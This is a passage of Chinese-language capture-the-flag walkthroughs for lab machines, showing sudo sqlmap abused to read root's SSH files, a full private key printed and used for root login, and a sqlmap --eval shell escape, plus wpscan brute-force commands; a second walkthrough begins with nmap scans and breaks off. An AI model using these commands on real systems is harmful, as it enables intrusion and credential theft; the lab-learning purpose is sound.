1)<br>    --string=STRING     String to match when query is evaluated to True<br>    --not-string=NOT..  String to match when query is evaluated to False<br>    --regexp=REGEXP     Regexp to match when query is evaluated to True<br>    --code=CODE         HTTP code to match when query is evaluated to True<br>    --smart             Perform thorough tests only <span class="hljs-keyword">if</span> positive heuristic(s)<br>    --text-only         Compare pages based only on the textual content<br>    --titles            Compare pages based only on their titles<br><br>  Techniques:<br>    These options can be used to tweak testing of specific SQL injection<br>    techniques<br><br>    --technique=TECH..  SQL injection techniques to use (default <span class="hljs-string">&quot;BEUSTQ&quot;</span>)<br>    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)<br>    --union-cols=UCOLS  Range of columns to <span class="hljs-built_in">test</span> <span class="hljs-keyword">for</span> UNION query SQL injection<br>    --union-char=UCHAR  Character to use <span class="hljs-keyword">for</span> bruteforcing number of columns<br>    --union-from=UFROM  Table to use <span class="hljs-keyword">in</span> FROM part of UNION query SQL injection<br>    --dns-domain=DNS..  Domain name used <span class="hljs-keyword">for</span> DNS exfiltration attack<br>    --second-url=SEC..  Resulting page URL searched <span class="hljs-keyword">for</span> second-order response<br>    --second-req=SEC..  Load second-order HTTP request from file<br><br>  Fingerprint:<br>    -f, --fingerprint   Perform an extensive DBMS version fingerprint<br><br>  Enumeration:<br>    These options can be used to enumerate the back-end database<br>    management system information, structure and data contained <span class="hljs-keyword">in</span> the<br>    tables<br><br>    -a, --all           Retrieve everything<br>    -b, --banner        Retrieve DBMS banner<br>    --current-user      Retrieve DBMS current user<br>    --current-db        Retrieve DBMS current database<br>    --hostname          Retrieve DBMS server hostname<br>    --is-dba            Detect <span class="hljs-keyword">if</span> the DBMS current user is DBA<br>    --<span class="hljs-built_in">users</span>             Enumerate DBMS <span class="hljs-built_in">users</span><br>    --passwords         Enumerate DBMS <span class="hljs-built_in">users</span> password hashes<br>    --privileges        Enumerate DBMS <span class="hljs-built_in">users</span> privileges<br>    --roles             Enumerate DBMS <span class="hljs-built_in">users</span> roles<br>    --dbs               Enumerate DBMS databases<br>    --tables            Enumerate DBMS database tables<br>    --columns           Enumerate DBMS database table columns<br>    --schema            Enumerate DBMS schema<br>    --count             Retrieve number of entries <span class="hljs-keyword">for</span> table(s)<br>    --dump              Dump DBMS database table entries<br>    --dump-all          Dump all DBMS databases tables entries<br>    --search            Search column(s), table(s) and/or database name(s)<br>    --comments          Check <span class="hljs-keyword">for</span> DBMS comments during enumeration<br>    --statements        Retrieve SQL statements being run on DBMS<br>    -D DB               DBMS database to enumerate<br>    -T TBL              DBMS database table(s) to enumerate<br>    -C COL              DBMS database table column(s) to enumerate<br>    -X EXCLUDE          DBMS database identifier(s) to not enumerate<br>    -U USER             DBMS user to enumerate<br>    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables<br>    --pivot-column=P..  Pivot column name<br>    --<span class="hljs-built_in">where</span>=DUMPWHERE   Use WHERE condition <span class="hljs-keyword">while</span> table dumping<br>    --start=LIMITSTART  First dump table entry to retrieve<br>    --stop=LIMITSTOP    Last dump table entry to retrieve<br>    --first=FIRSTCHAR   First query output word character to retrieve<br>    --last=LASTCHAR     Last query output word character to retrieve<br>    --sql-query=SQLQ..  SQL statement to be executed<br>    --sql-shell         Prompt <span class="hljs-keyword">for</span> an interactive SQL shell<br>    --sql-file=SQLFILE  Execute SQL statements from given file(s)<br><br>  Brute force:<br>    These options can be used to run brute force checks<br><br>    --common-tables     Check existence of common tables<br>    --common-columns    Check existence of common columns<br>    --common-files      Check existence of common files<br><br>  User-defined <span class="hljs-keyword">function</span> injection:<br>    These options can be used to create custom user-defined <span class="hljs-built_in">functions</span><br><br>    --udf-inject        Inject custom user-defined <span class="hljs-built_in">functions</span><br>    --shared-lib=SHLIB  Local path of the shared library<br><br>  File system access:<br>    These options can be used to access the back-end database management<br>    system underlying file system<br><br>    --file-read=FILE..  Read a file from the back-end DBMS file system<br>    --file-write=FIL..  Write a <span class="hljs-built_in">local</span> file on the back-end DBMS file system<br>    --file-dest=FILE..  Back-end DBMS absolute filepath to write to<br><br>  Operating system access:<br>    These options can be used to access the back-end database management<br>    system underlying operating system<br><br>    --os-cmd=OSCMD      Execute an operating system <span class="hljs-built_in">command</span><br>    --os-shell          Prompt <span class="hljs-keyword">for</span> an interactive operating system shell<br>    --os-pwn            Prompt <span class="hljs-keyword">for</span> an OOB shell, Meterpreter or VNC<br>    --os-smbrelay       One click prompt <span class="hljs-keyword">for</span> an OOB shell, Meterpreter or VNC<br>    --os-bof            Stored procedure buffer overflow exploitation<br>    --priv-esc          Database process user privilege escalation<br>    --msf-path=MSFPATH  Local path <span class="hljs-built_in">where</span> Metasploit Framework is installed<br>    --tmp-path=TMPPATH  Remote absolute path of temporary files directory<br><br>  Windows registry access:<br>    These options can be used to access the back-end database management<br>    system Windows registry<br><br>    --reg-read          Read a Windows registry key value<br>    --reg-add           Write a Windows registry key value data<br>    --reg-del           Delete a Windows registry key value<br>    --reg-key=REGKEY    Windows registry key<br>    --reg-value=REGVAL  Windows registry key value<br>    --reg-data=REGDATA  Windows registry key value data<br>    --reg-type=REGTYPE  Windows registry key value <span class="hljs-built_in">type</span><br><br>  General:<br>    These options can be used to <span class="hljs-built_in">set</span> some general working parameters<br><br>    -s SESSIONFILE      Load session from a stored (.sqlite) file<br>    -t TRAFFICFILE      Log all HTTP traffic into a textual file<br>    --answers=ANSWERS   Set predefined answers (e.g. <span class="hljs-string">&quot;quit=N,follow=N&quot;</span>)<br>    --<span class="hljs-built_in">base64</span>=BASE64P..  Parameter(s) containing Base64 encoded data<br>    --base64-safe       Use URL and filename safe Base64 alphabet (RFC 4648)<br>    --batch             Never ask <span class="hljs-keyword">for</span> user input, use the default behavior<br>    --binary-fields=..  Result fields having binary values (e.g. <span class="hljs-string">&quot;digest&quot;</span>)<br>    --check-internet    Check Internet connection before assessing the target<br>    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables<br>    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL<br>    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. <span class="hljs-string">&quot;logout&quot;</span>)<br>    --csv-del=CSVDEL    Delimiting character used <span class="hljs-keyword">in</span> CSV output (default <span class="hljs-string">&quot;,&quot;</span>)<br>    --charset=CHARSET   Blind SQL injection charset (e.g. <span class="hljs-string">&quot;0123456789abcdef&quot;</span>)<br>    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)<br>    --encoding=ENCOD..  Character encoding used <span class="hljs-keyword">for</span> data retrieval (e.g. GBK)<br>    --eta               Display <span class="hljs-keyword">for</span> each output the estimated <span class="hljs-keyword">time</span> of arrival<br>    --flush-session     Flush session files <span class="hljs-keyword">for</span> current target<br>    --forms             Parse and <span class="hljs-built_in">test</span> forms on target URL<br>    --fresh-queries     Ignore query results stored <span class="hljs-keyword">in</span> session file<br>    --gpage=GOOGLEPAGE  Use Google dork results from specified page number<br>    --har=HARFILE       Log all HTTP traffic into a HAR file<br>    --hex               Use hex conversion during data retrieval<br>    --output-dir=OUT..  Custom output directory path<br>    --parse-errors      Parse and display DBMS error messages from responses<br>    --preprocess=PRE..  Use given script(s) <span class="hljs-keyword">for</span> preprocessing (request)<br>    --postprocess=PO..  Use given script(s) <span class="hljs-keyword">for</span> postprocessing (response)<br>    --repair            Redump entries having unknown character marker (?)<br>    --save=SAVECONFIG   Save options to a configuration INI file<br>    --scope=SCOPE       Regexp <span class="hljs-keyword">for</span> filtering targets<br>    --skip-heuristics   Skip heuristic detection of SQLi/XSS vulnerabilities<br>    --skip-waf          Skip heuristic detection of WAF/IPS protection<br>    --table-prefix=T..  Prefix used <span class="hljs-keyword">for</span> temporary tables (default: <span class="hljs-string">&quot;sqlmap&quot;</span>)<br>    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)<br>    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)<br>    --web-root=WEBROOT  Web server document root directory (e.g. <span class="hljs-string">&quot;/var/www&quot;</span>)<br><br>  Miscellaneous:<br>    These options <span class="hljs-keyword">do</span> not fit into any other category<br><br>    -z MNEMONICS        Use short mnemonics (e.g. <span class="hljs-string">&quot;flu,bat,ban,tec=EU&quot;</span>)<br>    --alert=ALERT       Run host OS <span class="hljs-built_in">command</span>(s) when SQL injection is found<br>    --beep              Beep on question and/or when SQLi/XSS/FI is found<br>    --dependencies      Check <span class="hljs-keyword">for</span> missing (optional) sqlmap dependencies<br>    --disable-coloring  Disable console output coloring<br>    --list-tampers      Display list of available tamper scripts<br>    --offline           Work <span class="hljs-keyword">in</span> offline mode (only use session data)<br>    --purge             Safely remove all content from sqlmap data directory<br>    --results-file=R..  Location of CSV results file <span class="hljs-keyword">in</span> multiple targets mode<br>    --sqlmap-shell      Prompt <span class="hljs-keyword">for</span> an interactive sqlmap shell<br>    --tmp-dir=TMPDIR    Local directory <span class="hljs-keyword">for</span> storing temporary files<br>    --unstable          Adjust options <span class="hljs-keyword">for</span> unstable connections<br>    --update            Update sqlmap<br>    --wizard            Simple wizard interface <span class="hljs-keyword">for</span> beginner <span class="hljs-built_in">users</span><br>[10:21:23] [WARNING] your sqlmap version is outdated<br></code></pre></td></tr></table></figure><p>发现<code>-c</code>可以读取文件</p><p>尝试读取<code>root</code>的私钥</p><ul><li><p>先读取<code>authorized_keys</code>，（有该文件才能使用私钥登录）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@New:~$ <span class="hljs-built_in">sudo</span> /usr/bin/sqlmap -c /root/.ssh/authorized_keys<br>        ___<br>       __H__<br> ___ ___[,]_____ ___ ___  &#123;1.5.2#stable&#125;<br>|_ -| . [<span class="hljs-string">&#x27;]     | .&#x27;</span>| . |<br>|___|_  [)]_|_|_|__,|  _|<br>      |_|V...       |_|   http://sqlmap.org<br><br>[10:26:35] [CRITICAL] you have provided an invalid and/or unreadable configuration file (<span class="hljs-string">&#x27;MissingSectionHeaderError: File contains no section headers.</span><br><span class="hljs-string">file: &#x27;</span>/root/.ssh/authorized_keys<span class="hljs-string">&#x27;, line: 1</span><br><span class="hljs-string">&#x27;</span>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJLSzroyaI5CJA/xwd/KU8qS5KE+Sy8TeeaKX3+NfEf+ root@New\n<span class="hljs-string">&#x27;&#x27;</span>)<br>[10:26:35] [WARNING] your sqlmap version is outdated<br></code></pre></td></tr></table></figure></li><li><p>再读取<code>id_ed25519</code>，找到私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@New:~$ <span class="hljs-built_in">sudo</span> /usr/bin/sqlmap -c /root/.ssh/id_ed25519     <br>        ___<br>       __H__<br> ___ ___[(]_____ ___ ___  &#123;1.5.2#stable&#125;<br>|_ -| . [)]     | .<span class="hljs-string">&#x27;| . |</span><br><span class="hljs-string">|___|_  [)]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   http://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[10:27:52] [CRITICAL] you have provided an invalid and/or unreadable configuration file (&#x27;</span>MissingSectionHeaderError: File contains no section headers.<br>file: <span class="hljs-string">&#x27;/root/.ssh/id_ed25519&#x27;</span>, line: 1<br><span class="hljs-string">&#x27;-----BEGINOPENSSHPRIVATEKEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACCS0s66MmiOQiQP8cHfylPKkuShPksvE3nmil9/jXxH/gAAAJABMRbsATEW7AAAAAtzc2gtZWQyNTUxOQAAACCS0s66MmiOQiQP8cHfylPKkuShPksvE3nmil9/jXxH/gAAAEAOtKwQ02tXjPMfbI2/sWqEVhc1bmdH8uGINK2y4UN005LSzroyaI5CJA/xwd/KU8qS5KE+Sy8TeeaKX3+NfEf+AAAACHJvb3RATmV3AQIDBAU=-----ENDOPENSSHPRIVATEKEY-----&#x27;</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">[10:27:52] [WARNING] your sqlmap version is outdated</span><br></code></pre></td></tr></table></figure></li></ul><p>处理私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">cat</span> <span class="hljs-built_in">id</span> | sed -r <span class="hljs-string">&#x27;s/-----[A-Z]+-----//g&#x27;</span> | sed -r <span class="hljs-string">&#x27;s/.&#123;70&#125;/&amp;\n/g&#x27;</span> <br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br>QyNTUxOQAAACCS0s66MmiOQiQP8cHfylPKkuShPksvE3nmil9/jXxH/gAAAJABMRbsATEW<br>7AAAAAtzc2gtZWQyNTUxOQAAACCS0s66MmiOQiQP8cHfylPKkuShPksvE3nmil9/jXxH/g<br>AAAEAOtKwQ02tXjPMfbI2/sWqEVhc1bmdH8uGINK2y4UN005LSzroyaI5CJA/xwd/KU8qS<br>5KE+Sy8TeeaKX3+NfEf+AAAACHJvb3RATmV3AQIDBAU=<br></code></pre></td></tr></table></figure><p>形成私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br>QyNTUxOQAAACCS0s66MmiOQiQP8cHfylPKkuShPksvE3nmil9/jXxH/gAAAJABMRbsATEW<br>7AAAAAtzc2gtZWQyNTUxOQAAACCS0s66MmiOQiQP8cHfylPKkuShPksvE3nmil9/jXxH/g<br>AAAEAOtKwQ02tXjPMfbI2/sWqEVhc1bmdH8uGINK2y4UN005LSzroyaI5CJA/xwd/KU8qS<br>5KE+Sy8TeeaKX3+NfEf+AAAACHJvb3RATmV3AQIDBAU=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>登录<code>root</code>用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh root@192.168.2.43 -i 1<br>Linux New 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Tue Jul  1 08:08:27 2025 from 192.168.3.94<br>root@New:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@New:~# <br></code></pre></td></tr></table></figure><p><strong>ROOT FALG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@New:~# <span class="hljs-built_in">cat</span> /root/root.txt<br>flag&#123;root-12e5770e-5667-11f0-8acc-4fa40e22b275&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、WordPress渗透"><a href="#1、WordPress渗透" class="headerlink" title="1、WordPress渗透"></a>1、WordPress渗透</h2><p> <strong>信息收集：锁定突破口</strong></p><ul><li><strong>指纹识别</strong>：通过<code>/wp-admin/</code>、<code>/wp-includes/</code>等路径识别WordPress版本，寻找已知漏洞。  </li><li><strong>主题&#x2F;插件探测</strong>：扫描<code>/wp-content/themes/</code>和<code>/wp-content/plugins/</code>目录，获取插件名称及版本（如使用<code>WPScan</code>工具）。  </li><li><strong>敏感文件泄露</strong>：查找<code>wp-config.php</code>备份文件（如<code>wp-config.php.bak</code>），可能泄露数据库账号密码。</li></ul><p><strong>漏洞利用：四大高危方向</strong></p><ul><li><strong>核心程序漏洞</strong>：如CVE-2022-21661（SQL注入）、CVE-2022-21662（权限提升）。  </li><li><strong>插件&#x2F;主题漏洞</strong>：  <ul><li>文件上传漏洞（如未过滤的<code>.php</code>文件上传）。  </li><li>SQL注入（如某表单未做参数过滤）。  </li><li>远程代码执行（RCE）。</li></ul></li><li><strong>弱口令爆破</strong>：针对<code>wp-login.php</code>页面，使用字典爆破管理员密码。  </li><li><strong>权限提升</strong>：通过低权限账户（如投稿作者）结合插件漏洞获取管理员权限。</li></ul><p><strong>权限维持与横向移动</strong></p><ul><li><strong>写入Webshell</strong>：通过文件上传或编辑主题文件插入恶意代码。  </li><li><strong>据库后门</strong>：在<code>wp_posts</code>表中插入PHP代码，实现持久化控制。  </li><li><strong>嗅探敏感数据</strong>：窃取用户信息、支付数据，甚至控制服务器。</li></ul><h2 id="2、wpscan使用教程"><a href="#2、wpscan使用教程" class="headerlink" title="2、wpscan使用教程"></a>2、wpscan使用教程</h2><ul><li>全站扫描：输出 WordPress 核心、插件、主题版本信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --api-token=xxxx<br></code></pre></td></tr></table></figure></li><li>模糊扫描（无 Token）：仅显示版本号，无漏洞详情<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --no-api-token<br></code></pre></td></tr></table></figure></li><li>插件漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --enumerate p<br></code></pre></td></tr></table></figure></li><li>主题漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --enumerate t<br></code></pre></td></tr></table></figure></li><li>用户枚举<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --enumerate u<br></code></pre></td></tr></table></figure></li><li>指定用户爆破<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --username admin --wordlist /path/to/passwords.txt<br><span class="hljs-comment">#多线程加速</span><br>添加 --threads 30 提升效率<br></code></pre></td></tr></table></figure></li><li>文件扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --enumerate tt<br></code></pre></td></tr></table></figure></li><li>组合命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --api-token YOUR_TOKEN --enumerate u,p,t,vp,vt --username admin --wordlist /dicts/top1000.txt --threads 20<br></code></pre></td></tr></table></figure></li></ul><h2 id="3、Sqlmap提权"><a href="#3、Sqlmap提权" class="headerlink" title="3、Sqlmap提权"></a>3、Sqlmap提权</h2><h3 id="方案一：sudo-1"><a href="#方案一：sudo-1" class="headerlink" title="方案一：sudo"></a>方案一：sudo</h3><p><code>sqlmap</code>命令具有<code>sudo</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> sqlmap -u 127.0.0.1 --<span class="hljs-built_in">eval</span>=<span class="hljs-string">&quot;import os; os.system(&#x27;/bin/sh&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><h3 id="方案二：读取私钥文件"><a href="#方案二：读取私钥文件" class="headerlink" title="方案二：读取私钥文件"></a>方案二：读取私钥文件</h3><p><code>sqlmap</code>命令参数<code>-c</code>，可以读取文件，可以读取<code>root</code>用户的ssh私钥</p><h2 id="4、读取SSH私钥的步骤"><a href="#4、读取SSH私钥的步骤" class="headerlink" title="4、读取SSH私钥的步骤"></a>4、读取SSH私钥的步骤</h2><ol><li>SSH私钥默认存储在用户主目录的<code>.ssh</code>隐藏文件夹中</li><li>首先查看是否有文件<code>authorized_keys</code>，必须拥有该文件才能使用私钥登录</li><li>根据<code>authorized_keys</code>，查看私钥的文件名，一般是<code>id_rsa</code>或者<code>id_ed25519</code></li><li>验证私钥格式，确保私钥格式符合 OpenSSH 标准（以 <code>-----BEGIN OPENSSH PRIVATE KEY-----</code> 开头，以 <code>-----END OPENSSH PRIVATE KEY-----</code> 结尾），同时私钥每行<code>70</code>个字符</li><li>私钥文件的权限必须为<code>600</code>，否则SSH客户端会拒绝使用</li></ol>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wordpress</tag>
      
      <tag>CVE-2019-9978</tag>
      
      <tag>sudo-sqlmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Leak</title>
    <link href="/Maze-sec/Leak/"/>
    <url>/Maze-sec/Leak/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap -sn 192.168.2.0/24                                  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-01 09:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00067s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00045s latency).<br>MAC Address: 08:00:27:1A:06:78 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.42<br>Host is up (0.00046s latency).<br>MAC Address: 08:00:27:A6:0D:F6 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.23 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.42</code></p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -p- 192.168.2.42                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-01 09:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.42<br>Host is up (0.00018s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:A6:0D:F6 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.48 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22和80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.42<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-01 09:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.42<br>Host is up (0.013s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Kali Linux - \xE5\xAE\x89\xE5\x85\xA8\xE6\xB8\x97\xE9\x80\x8F\xE6\xB5\x8B\xE8\xAF\x95\xE5\xB9\xB3\xE5\x8F\xB0<br>|_http-server-header: Apache/2.4.62 (Debian)<br>MAC Address: 08:00:27:A6:0D:F6 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.37 seconds<br></code></pre></td></tr></table></figure><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap -sU --top-ports 20 192.168.2.42<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-01 19:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> sunset.leak.dsz (192.168.2.42)<br>Host is up (0.00075s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   open          snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        